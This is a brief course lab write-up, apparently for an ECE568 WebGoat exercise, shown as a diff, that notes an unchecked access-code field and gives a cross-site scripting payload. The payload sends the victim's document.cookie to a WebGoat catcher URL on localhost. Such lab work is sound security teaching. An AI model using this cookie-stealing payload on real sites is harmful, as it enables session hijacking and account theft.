@@ -1,0 +1,7 @@
+A quick check was done to find that the three digit access code allowed for malicious code injection. It probably does not check user input for malicious JavaScript. A post on piazza said that it was required to remove the "ECE568ID=" part of the cookie string.
+
+
+<script> 
+    XssImage = new Image();
+    XssImage.src="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&cookie=" + document.cookie.substring(9);
+</script>
